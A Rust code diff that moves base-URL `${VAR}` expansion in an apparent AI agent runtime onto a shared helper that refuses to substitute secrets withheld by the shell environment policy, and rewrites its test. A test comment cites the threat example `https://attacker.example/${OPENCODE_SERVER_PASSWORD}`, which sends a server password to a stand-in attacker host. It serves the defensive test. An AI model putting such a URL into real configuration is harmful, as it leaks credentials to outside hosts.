@@ -996,48 +996,20 @@ impl LlmRequestSender for RouteLlmSender {
     }
 }
 
-/// `${VAR}` interpolation over the env (provider.ts:1734-1741).
+/// `${VAR}` interpolation over the env (provider.ts:1734-1741), through the
+/// one implementation (`alforria_core::config::interpolate_dollar`).
 ///
-/// A base URL is where requests go, and it can come from a config the
-/// agent is able to write: a variable the shell environment policy
-/// withholds from the agent's own processes (the server's password, a
-/// provider key) is not put into one. Such a reference is left as written.
+/// What reaches here is the host's: a base URL from the user's own config or
+/// the model catalog. A project's or a remote config had its `${VAR}`
+/// expanded at load, under the rule of its origin
+/// (`config::precedence::expand_base_urls`), and none is left in it. Even
+/// for the host's own a URL never carries a variable the shell environment
+/// policy withholds from the agent's processes.
 fn interpolate_env(url: &str) -> String {
-    interpolate_env_with(url, &alforria_core::shell_env::current(), |key| {
+    let policy = alforria_core::shell_env::current();
+    alforria_core::config::interpolate_dollar(url, &|key| !policy.denied(key), &|key| {
         std::env::var(key).ok()
     })
-}
-
-fn interpolate_env_with(
-    url: &str,
-    policy: &alforria_core::shell_env::ShellEnvPolicy,
-    lookup: impl Fn(&str) -> Option<String>,
-) -> String {
-    let mut out = String::new();
-    let mut rest = url;
-    while let Some(start) = rest.find("${") {
-        out.push_str(&rest[..start]);
-        rest = &rest[start..];
-        if let Some(end) = rest.find('}') {
-            let key = &rest[2..end];
-            let value = if policy.denied(key) {
-                tracing::warn!("not substituting ${{{key}}} into a base URL: it is a secret");
-                None
-            } else {
-                lookup(key)
-            };
-            match value {
-                Some(value) => out.push_str(&value),
-                None => out.push_str(&rest[..end + 1]),
-            }
-            rest = &rest[end + 1..];
-        } else {
-            out.push_str(rest);
-            return out;
-        }
-    }
-    out.push_str(rest);
-    out
 }
 
 // ---------------------------------------------------------------------------
@@ -1120,29 +1092,14 @@ mod tests {
     /// withholds: `https://attacker.example/${OPENCODE_SERVER_PASSWORD}`.
     #[test]
     fn interpolate_env_never_substitutes_a_withheld_secret() {
-        let policy = alforria_core::shell_env::ShellEnvPolicy::default();
-        let lookup = |key: &str| match key {
-            "OPENCODE_SERVER_PASSWORD" => Some("hunter2".to_string()),
-            "ANTHROPIC_API_KEY" => Some("sk-ant".to_string()),
-            "AZURE_RESOURCE_NAME" => Some("my-resource".to_string()),
-            _ => None,
-        };
-        assert_eq!(
-            interpolate_env_with(
-                "https://x.example/${OPENCODE_SERVER_PASSWORD}/${ANTHROPIC_API_KEY}",
-                &policy,
-                lookup
-            ),
-            "https://x.example/${OPENCODE_SERVER_PASSWORD}/${ANTHROPIC_API_KEY}"
+        std::env::set_var("OPENCODE_API_KEY", "sk-runtime-secret");
+        std::env::set_var("ALFORRIA_RUNTIME_TEST_REGION", "eu");
+        let url = interpolate_env(
+            "https://${ALFORRIA_RUNTIME_TEST_REGION}.x.example/${OPENCODE_API_KEY}",
         );
-        assert_eq!(
-            interpolate_env_with(
-                "https://${AZURE_RESOURCE_NAME}.openai.azure.com",
-                &policy,
-                lookup
-            ),
-            "https://my-resource.openai.azure.com"
-        );
+        std::env::remove_var("OPENCODE_API_KEY");
+        std::env::remove_var("ALFORRIA_RUNTIME_TEST_REGION");
+        assert_eq!(url, "https://eu.x.example/");
     }
 
     #[test]
